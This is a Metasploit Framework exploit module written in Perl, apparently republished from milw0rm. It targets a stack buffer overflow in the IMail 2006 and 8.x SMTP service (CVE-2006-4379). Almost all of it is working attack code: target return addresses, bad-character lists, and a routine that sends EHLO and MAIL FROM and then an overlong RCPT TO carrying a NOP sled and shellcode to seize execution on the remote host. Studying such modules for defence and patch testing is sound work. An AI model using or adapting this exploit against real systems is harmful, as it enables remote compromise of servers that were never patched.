## 
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::imail_smtp_rcpt_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info = {
	'Name'    => 'IMail 2006 and 8.x SMTP Stack Overflow Exploit',
	'Version'  => '$Revision: 1.0 $',
	'Authors' => [ 'Jacopo Cervini <acaro [at] jervus.it>', ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 25],
		'Encoder'   => [1, 'EncodedPayload', 'Use Pex!!'],

		
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'seh' },
	'Payload' =>
	  {
		'Space'     => 400,
		'BadChars'  => "\x00\x0d\x0a\x20\x3e\x22\x40",
		'Keys'      => ['+ws2ord'],
		

	  },

	'Description'  => Pex::Text::Freeform(qq{
This module exploits a stack based buffer overflow in IMail 2006 and 8.x SMTP service.
If we send a long strings for RCPT TO command contained within the characters '@' and ':'
we can overwrite the eip register and exploit the vulnerable smpt service
}),

	'Refs'  =>
	  [
		['BID', '19885'],
		['CVE', '2006-4379'],
		['URL',   'http://www.zerodayinitiative.com/advisories/ZDI-06-028.html'],
	  ],

	'Targets' =>
	  [

	['Universal IMail 8.10',0x100188c3 ], # pop eax, ret in SmtpDLL.dll for IMail 8.10
	['Universal IMail 8.12',0x100191c4 ], # pop eax, ret in SmtpDLL.dll for IMail 8.12


	  ],

	'DefaultTarget' => 0,

	'Keys' => ['smtp'],

	'DisclosureDate' => 'September 7 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];



	my $ehlo = "EHLO " . "\r\n";

	my $mail_from = "MAIL FROM:" . "\x20" . "\x3c"."acaro". "\x40"."jervus.it" . "\x3e" . "\r\n";


	my $pattern = "\x20\x3c\x40";
	$pattern .= pack('V', $target->[1]);
	$pattern .="\x3a" . $self->MakeNops((0x1e8-length ($shellcode)));
	$pattern .= $shellcode;
	$pattern .= "\x4a\x61\x63\x3e"; 

	my $request = "RCPT TO: " . $pattern ."\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using pop eax, ret at 0x%.8x...", $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}
my $r = $s->Recv(-1, 5);

	$s->Send($ehlo);
	$self->PrintLine("[*] I'm sending ehlo command");
	$self->PrintLine("[*] $r");
	sleep(2);
		
	$s->Send($mail_from);
	$self->PrintLine("[*] I'm sending mail from command");
	$r = $s->Recv(-1, 10);
	$self->PrintLine("[*] $r");
	sleep(2);

	$s->Send($request);
	$self->PrintLine("[*] I'm sending rcpt to command");
	sleep(2);

	return;
}

# milw0rm.com [2007-02-04]
